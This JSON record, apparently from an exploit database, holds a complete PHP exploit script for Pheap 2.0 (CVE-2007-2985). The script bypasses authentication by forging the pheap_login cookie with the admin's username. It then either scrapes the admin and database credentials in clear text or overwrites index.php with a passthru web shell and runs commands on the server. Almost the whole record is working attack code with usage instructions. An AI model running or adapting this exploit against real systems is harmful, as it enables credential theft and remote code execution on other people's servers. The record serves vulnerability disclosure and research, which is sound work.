{
  "id": "4006",
  "title": "Pheap 2.0 - Authentication Bypass / Remote Code Execution",
  "cve": "CVE-2007-2985",
  "vuln_type": "rce",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?php\r\n\r\n/*\r\n\r\nExplanation:\r\n\r\nThe user verification routine used in most of the files is:\r\n\r\n#####\r\n#\r\n#   include(\"lib/config.php\");\r\n#\tif ($_COOKIE['pheap_login'] != $username){\r\n#\theader(\"Location: login.php\");\r\n#\t} else { [CONTINUE EXECUTING CODE] }\r\n#\r\n#####\r\n\r\nSo basically it's saying \"If the value within the cookie pheap_login is not the same value\r\nthat is assigned to the $username variable withing lib/config.php then you have to be redirected\r\nto the login page\".\r\n\r\nSo if we know the admin's username we can access any page that uses this authentication method. Also, \r\nwe can retrieve all credentials in clear-text. ;)\r\n\r\n*/\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nif ($argc<5) {\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"              Pheap 2.0 Admin Bypass/Remote Code Execution\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_pheap.php [OPTION] [HOST] [PATH] [USER] ([COMMAND])\\r\\n\\r\\n\";\r\nprint \"[OPTION]  = 0 = Credentials Disclosures\\r\\n\";\r\nprint \"            1 = Remote Code Execution\\r\\n\";\r\nprint \"[HOST] \t  = Target server's hostname or ip address\\r\\n\";\r\nprint \"[PATH] \t  = Path where Pheap is located\\r\\n\";\r\nprint \"[USER] \t  = Admin's username\\r\\n\";\r\nprint \"[COMMAND] = Command to execute\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_pheap.php 0 victim.com /pheap/ admin\\r\\n\";\r\nprint \"     w4ck1ng_pheap.php 1 victim.com /pheap/ admin \\\"ls -lia\\\"\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\ndie;\r\n}\r\n\r\n// Props to rgod for the following functions\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$exploit = $argv[1];\r\n$host = $argv[2];\r\n$path = $argv[3];\r\n$user = $argv[4];\r\n$cmd  = $argv[5];\r\n$cmd  = urlencode($cmd);\r\n$port=80;$proxy=\"\";\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nif ($exploit==0){\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"              Pheap 2.0 Admin Bypass/Remote Code Execution\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n    $packet =\"GET \" . $path . \"settings.php HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Cookie: pheap_login=\" . $user . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"This is the settings panel\")){}\r\n    else{echo \"...Failed!\\r\\n\"; exit();}\r\n\r\n    $temp=explode(\"name=\\\"user_name\\\" class=\\\"ieleft\\\" value=\\\"\",$html);\r\n    $temp2=explode(\"\\\" /> <strong>:Username\",$temp[1]);\r\n    $ret_user=$temp2[0];\r\n\r\n    echo \"[+] Admin User: \" . $ret_user . \"\\r\\n\";\r\n\r\n    $temp=explode(\"name=\\\"password\\\" class=\\\"ieleft\\\" value=\\\"\",$html);\r\n    $temp2=explode(\"\\\" /> <strong>:Password\",$temp[1]);\r\n    $ret_user=$temp2[0];\r\n\r\n    echo \"[+] Admin Pass: \" . $ret_user . \"\\r\\n\";\r\n\r\n    $temp=explode(\"name=\\\"dbhost\\\" class=\\\"ieleft\\\" id=\\\"dbhost\\\" value=\\\"\",$html);\r\n    $temp2=explode(\"\\\" /> <strong>:Database Host\",$temp[1]);\r\n    $ret_user=$temp2[0];\r\n\r\n    echo \"[+] Database Host: \" . $ret_user . \"\\r\\n\";\r\n\r\n    $temp=explode(\"name=\\\"dbuser\\\" class=\\\"ieleft\\\" id=\\\"dbuser\\\" value=\\\"\",$html);\r\n    $temp2=explode(\"\\\" /> <strong>:Database Username\",$temp[1]);\r\n    $ret_user=$temp2[0];\r\n\r\n    echo \"[+] Database User: \" . $ret_user . \"\\r\\n\";\r\n\r\n    $temp=explode(\"name=\\\"dbpass\\\" class=\\\"ieleft\\\" id=\\\"dbpass\\\" value=\\\"\",$html);\r\n    $temp2=explode(\"\\\" /> <strong>:Database Password\",$temp[1]);\r\n    $ret_user=$temp2[0];\r\n\r\n    echo \"[+] Database Pass: \" . $ret_user . \"\\r\\n\";\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\nif($exploit==1){\r\n\r\n    $packet =\"GET \" . $path . \"edit.php?em=file&filename=\" . $path . \"index.php HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Cookie: pheap_login=\" . $user . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n\r\n    sendpacketii($packet);\r\n\r\n    $temp=explode(\"name=\\\"filename\\\" value=\\\"\",$html);\r\n    $temp2=explode(\"\\\">\",$temp[1]);\r\n    $fullpath=$temp2[0];\r\n\r\n\t$shell = '<?php echo \"<font color=#FFFFFF>...Silentz</font>\";ini_set(\"max_execution_time\",0);passthru($_GET[cmd]);echo \"<font color=#FFFFFF>...Silentz</font>\";?>';\r\n\t$data = \"mce_editor_0_styleSelect=\";\r\n\t$data .= \"&mce_editor_0_formatSelect=\";\r\n\t$data .= \"&mce_editor_0_fontNameSelect=\";\r\n\t$data .= \"&mce_editor_0_fontSizeSelect=0\";\r\n\t$data .= \"&mce_editor_0_zoomSelect=100%25\";\r\n\t$data .= \"&content=\" . urlencode($shell);\r\n\t$data .= \"&filename=\" . urlencode($fullpath);\r\n\t$data .= \"&update_text.x=57\";\r\n\t$data .= \"&update_text.y=15\"; \r\n\r\n    $packet =\"POST \" . $path . \"edit.php?action=update_doc HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Accept: */*\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Cookie: pheap_login=\" . $user . \"\\r\\n\";\r\n    $packet.=\"Referer: http://\" . $host.$path . \"edit.php?em=file&filename=\" . $path . \"index.php\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n    sendpacketii($packet);\r\n\r\n    $packet =\"GET \" . $path . \"index.php?cmd=\" . $cmd . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"...Silentz\"))\r\n     {\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"              Pheap 2.0 Admin Bypass/Remote Code Execution\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n       $temp=explode(\"...Silentz</font>\",$html);\r\n       $temp2=explode(\"<font color=#FFFFFF>\",$temp[1]);\r\n       echo \"===============================================================\\r\\n\\r\\n\";\r\n       echo $temp2[0];\r\n       echo \"\\r\\n===============================================================\\r\\n\";\r\n       echo \"\\r\\n[+] Shell...http://\" .$host.$path. \"index.php?cmd=[COMMAND]\\r\\n\";\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\n\tprint \"            \t\t        ...Silentz\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n       die;\r\n     }\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-05-29]",
  "url": "https://www.exploit-db.com/exploits/4006"
}